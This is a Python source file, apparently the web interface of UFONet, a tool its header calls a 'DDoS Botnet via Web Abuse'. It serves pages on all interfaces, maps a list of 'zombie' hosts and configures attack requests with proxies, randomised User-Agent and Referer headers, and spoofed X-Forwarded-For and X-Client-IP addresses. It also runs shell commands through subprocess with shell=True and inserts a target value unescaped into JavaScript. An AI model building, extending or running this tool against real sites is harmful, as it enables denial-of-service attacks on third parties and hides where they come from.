#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, threading, re, base64, os
import webbrowser, subprocess, urllib, json, sys
from options import UFONetOptions
from pprint import pprint
from main import UFONet

host = "0.0.0.0"
port = 9999

class ClientThread(threading.Thread):
    def __init__(self, ip, port, socket):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.socket = socket
        self.pages = Pages()

    def run(self):
        req = self.socket.recv(2048)
        res = self.pages.get(req)
        if res is None:
            self.socket.close()
            return
        out = "HTTP/1.0 %s\r\n" % res["code"]
        out += "Content-Type: %s\r\n\r\n" % res["ctype"]
        out += "%s" % res["html"]
        self.socket.send(out)
        self.socket.close()
        if "run" in res and len(res["run"]):
            subprocess.Popen(res["run"], shell=True)

class Pages():

    def file_len(self, fn):
        with open(fn) as f:
            for i, l in enumerate(f):
                pass
        return i + 1

    def html_army_map(self,target=None):
        target_js="total_zombies = "+str(self.file_len('zombies.txt'))+"\ninitMap()\n\n"
        if target is not None:
            target_js += "$('#ufomsg').load('/js/ajax.js?doll="+target+"')\n"
        return self.pages["/header"] + """
  <link rel="stylesheet" href="/js/style.css" />
  <link rel="stylesheet" href="/js/ajaxmap.css" />
  <link rel="stylesheet" href="/js/leaflet/leaflet.css" />
  <link rel="stylesheet" href="/js/cluster/MarkerCluster.Default.css"/>
  <link rel="stylesheet" href="/js/cluster/MarkerCluster.css"/>
  <script src="/js/leaflet/leaflet.js"></script>
  <script src="/js/cluster/leaflet.markercluster-src.js"></script>
  <script src="/js/jquery-1.10.2.min.js"></script>
  <script src="/js/rlayer-src.js"></script>
  <script src="/js/raphael.js"></script>
  <script src="/js/ufo.js"></script>
  <script src="/js/ajax.js"></script>
</head><body bgcolor="black" text="black">
  <div id="wrapper">
      <div id="map" style="width: 100%; height: 100%"></div>
  </div>
<script type="text/javascript">
window.onload = function(){
"""+target_js+"""
}
  </script>
<center>
""" + self.pages["/footer"]      

    def html_request_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="lime" style="font-family:Courier, 'Courier New', monospace;" >
<center>settings updated"""+self.pages["/footer"]

    def html_requests(self):
        # read requests configuration file (json)
        try:
            with open('webcfg.json') as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists('webcfg.json') == True:
                print '\n[Error] - Cannot open: webcfg.json. Change permissions to use WebGui correctly\n'
                sys.exit(2)
            else: # generate default requests configuration file
                print '\n[Info] - Cannot found: webcfg.json... Generating!\n'
                with open('webcfg.json', "w") as f:
                    json.dump({"rproxy": "NONE", "ruseragent": "RANDOM", "rreferer": "RANDOM", "rhost": "NONE", "rxforw": "on", "rxclient": "on", "rtimeout": "10", "rretries": "1", "rdelay": "0", "threads": "5"}, f, indent=4)
        # set values of requests configuration from json file to html form
        with open('webcfg.json') as data_file:
            data = json.load(data_file)
        self.instance = UFONet() # instance main class to take random generated values
        self.rproxy = data["rproxy"]
        if self.rproxy == "NONE":
            self.rproxy = ""
        self.ruseragent = data["ruseragent"]
        if self.ruseragent == "RANDOM":
            self.ruseragent = self.instance.user_agent # random user-agent
        self.rreferer = data["rreferer"]
        if self.rreferer == "RANDOM":
            self.rreferer = self.instance.referer # random referer
        self.rhost = data["rhost"]
        if self.rhost == "NONE":
            self.rhost = ""
        self.rxforw = data["rxforw"]
        if self.rxforw == "on":
            self.rxforw_check = 'checked'
        else:
            self.rxforw_check = ''
        self.rxclient = data["rxclient"]
        if self.rxclient == "on":
            self.rxclient_check = 'checked'
        else:
            self.rxclient_check = ''
        self.rtimeout = data["rtimeout"]
        self.rretries = data["rretries"]
        self.rdelay = data["rdelay"]
        self.threads = data["threads"]
        return self.pages["/header"] + """
<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_parent","fulscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="lime" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure requests:</u>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> Use proxy server</td>
 <td> <input type="text" name="rproxy" value='"""+str(self.rproxy)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP User-Agent header</td>
 <td> <input type="text" name="ruseragent" value='"""+str(self.ruseragent)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP Referer header</td>
 <td> <input type="text" name="rreferer" value='"""+str(self.rreferer)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP Host header</td>
 <td> <input type="text" name="rhost" value='"""+str(self.rhost)+"""'></td>
</tr>
<tr>
 <td> Set your HTTP X-Forwarded-For with random IP values</td>
 <td> <input type="checkbox" name='rxforw' """+self.rxforw_check+"""></td>
</tr>
<tr>
 <td> Set your HTTP X-Client-IP with random IP values</td>
 <td> <input type="checkbox" name='rxclient' """+self.rxclient_check+"""></td>
</tr>
<tr>
 <td> Select your timeout</td>
 <td> <input type="text" name="rtimeout" value='"""+str(self.rtimeout)+"""'></td>
</tr>
<tr>
 <td> Retries when the connection timeouts</td>
 <td> <input type="text" name="rretries" value='"""+str(self.rretries)+"""'></td>
</tr>
<tr>
 <td> Delay in seconds between each HTTP request</td>
 <td> <input type="text" name="rdelay" value='"""+str(self.rdelay)+"""'></td>
</tr>
<tr>
 <td> Number of threads</td>
 <td> <input type="text" name="threads" value='"""+str(self.threads)+"""'></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="Requests()"></pre>
</form>
""" + self.pages["/footer"]

    def __init__(self):
        self.options = UFONetOptions()
        self.mothership = UFONet()
        self.pages = {}

        self.pages["/header"] = """<!DOCTYPE html><html>
<head>
<link rel="icon" type="image/png" href="/favicon.ico" />
<meta name="author" content="psy">
<meta name="robots" content="noindex, nofollow">
<meta http-equiv="content-type" content="text/xml; charset=utf-8" /> 
<title>UFONet: DDoS via WebAbuse</title>
<script language="javascript" src="/lib.js"></script>
<style>
body{font-size:15px}a,a:hover{outline:none;color:red;font-size:14px;font-weight:700}nav ul ul{display:none}nav ul li:hover > ul{display:block}nav ul{list-style:none;position:relative;display:inline-table}nav ul:after{content:"";clear:both;display:block}nav ul li{font-size:12px}nav ul li a{display:block;padding:2px 3px}html,body{height:100%}ul,li{margin:0;padding:0}.ringMenu{width:100px;margin:80px auto}.ringMenu ul{list-style:none;position:relative;width:100px;color:#fff}.ringMenu ul a{color:#fff}.ringMenu ul li{-webkit-transition:all .3s ease-in-out;-moz-transition:all .3s ease-in-out;-o-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.ringMenu ul li a{display:block;width:100px;height:100px;background:rgba(50,50,50,0.7);text-align:center;line-height:100px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px}.ringMenu ul li a:hover{background:rgba(230,150,20,0.7)}.ringMenu ul li:not(.main){-webkit-transform:rotate(-180deg) scale(0);-moz-transform:rotate(-180deg) scale(0);-o-transform:rotate(-180deg) scale(0);transform:rotate(-180deg) scale(0);opacity:0}.ringMenu:hover ul li{-webkit-transform:rotate(0) scale(1);-moz-transform:rotate(0) scale(1);-o-transform:rotate(0) scale(1);transform:rotate(0) scale(1);opacity:1}.ringMenu ul li.top{-webkit-transform-origin:50% 152px;-moz-transform-origin:50% 152px;-o-transform-origin:50% 152px;transform-origin:50% 152px;position:absolute;top:-102px;left:0}.ringMenu ul li.bottom{-webkit-transform-origin:50% -52px;-moz-transform-origin:50% -52px;-o-transform-origin:50% -52px;transform-origin:50% -52px;position:absolute;bottom:-102px;left:0}.ringMenu ul li.right{-webkit-transform-origin:-52px 50%;-moz-transform-origin:-52px 50%;-o-transform-origin:-52px 50%;transform-origin:-52px 50%;position:absolute;top:0;right:-102px}.ringMenu ul li.left{-webkit-transform-origin:152px 50%;-moz-transform-origin:152px 50%;-o-transform-origin:152px 50%;transform-origin:152px 50%;position:absolute;top:0;left:-102px}textarea{padding:30px 0}
</style>"""

        self.pages["/footer"] = """</center></body>
</html>
"""

        self.pages["/favicon.ico"] = base64.b64decode("AAABAAEAEA8AAAEAIAAkBAAAFgAAACgAAAAQAAAAHgAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAD/AAAA/wAAAP8AAAD/AAAAAAAAAN0AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAAAAAAA/wAAAP8AAAD/AAAA/wAAAIEAAAD/AAAA/wAAAAAAAAD/AAAAAAAAAAAAAAD/AAAAlwAAAAAAAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAADtAAAA/wAAAIEAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAP8AAAAAAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAXAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAP8AAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAA/wAAAP8AAAAAAAAA/wAAAP8AAAD/AAAAAAAAAFwAAAAAAAAA/wAAAP8AAAAAAAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAD/AAAAAAAAAP8AAAD/AAAA/wAAAOwAAAAAAAAAAAAAAOsAAAAAAAAA/wAAAP8AAAD/AAAAAAAAAP8AAAD/AAAA/wAAAAAAAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAAAAAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALUAAAAAAAAA/wAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAD/AAAA/wAAAP8AAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcQAAAP8AAAD/AAAA/wAAAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADhAQAAAWQAAPAGAACAOwAAvHsAALATAACgBwAAI5cAAPPQAADRFwAA8BcAAOg/AADsbwAA998AAPw/AAA=")

        self.pages["/ufonet-logo.png"] = base64.b64decode("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